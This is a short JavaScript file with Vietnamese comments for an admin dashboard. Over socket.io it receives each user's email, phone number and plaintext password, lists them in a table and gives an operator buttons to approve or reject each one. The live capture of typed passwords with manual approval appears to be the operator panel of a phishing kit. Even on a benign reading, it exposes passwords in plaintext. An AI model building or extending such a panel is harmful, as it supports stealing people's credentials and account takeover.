// Khởi tạo socket
const socket = io();

// Tham chiếu tới các nút
const approveBtn = document.getElementById('approve-btn');
const rejectBtn = document.getElementById('reject-btn');

// Tham chiếu tới bảng
const tableBody = document.getElementById('user-table').getElementsByTagName('tbody')[0];

// Lắng nghe sự kiện nhận dữ liệu người dùng từ client
socket.on('user_data', (data) => {
    console.log('Received user data:', data);
    // Tạo một hàng mới trong bảng để hiển thị dữ liệu người dùng
    const row = tableBody.insertRow();
    row.setAttribute('data-user-id', data.email); // Dùng email làm id cho mỗi user

    // Thêm các ô vào hàng
    row.insertCell(0).textContent = data.email;
    row.insertCell(1).textContent = data.phone;
    row.insertCell(2).textContent = data.password;

    // Thêm nút xử lý cho hành động
    const actionCell = row.insertCell(3);
    const approveButton = document.createElement('button');
    approveButton.textContent = 'Approve';
    approveButton.classList.add('approve-btn');
    approveButton.onclick = () => handleApprove(data);
    actionCell.appendChild(approveButton);

    const rejectButton = document.createElement('button');
    rejectButton.textContent = 'Reject';
    rejectButton.classList.add('reject-btn');
    rejectButton.onclick = () => handleReject(data);
    actionCell.appendChild(rejectButton);
});

// Hàm xử lý khi admin nhấn "Approve"
function handleApprove(data) {
    console.log('Approved user:', data);
    // Gửi phản hồi "approve" đến client (người dùng)
    socket.emit('admin_response', { email: data.email, response: 'approved' });
}

// Hàm xử lý khi admin nhấn "Reject"
function handleReject(data) {
    console.log('Rejected user:', data);
    // Gửi phản hồi "reject" đến client (người dùng)
    socket.emit('admin_response', { email: data.email, response: 'rejected' });
}
